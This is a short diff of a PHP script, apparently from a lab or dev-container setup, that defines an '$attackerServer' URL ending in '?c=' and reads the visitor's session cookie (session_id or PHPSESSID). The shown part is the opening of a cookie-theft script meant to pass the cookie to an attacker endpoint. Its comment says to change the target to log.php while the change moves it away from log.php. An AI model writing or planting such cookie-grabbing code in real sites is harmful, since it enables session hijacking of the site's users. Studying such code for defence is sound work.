@@ -1,6 +1,6 @@
 <?php
 // Change the target URL to log.php
-$attackerServer = "http://localhost/.devcontainer/log.php?c=";
+$attackerServer = "http://localhost/.devcontainer/attack?c=";
 
 // Get the cookie value
 $cookieValue = $_COOKIE['session_id'] ?? $_COOKIE['PHPSESSID'] ?? '';
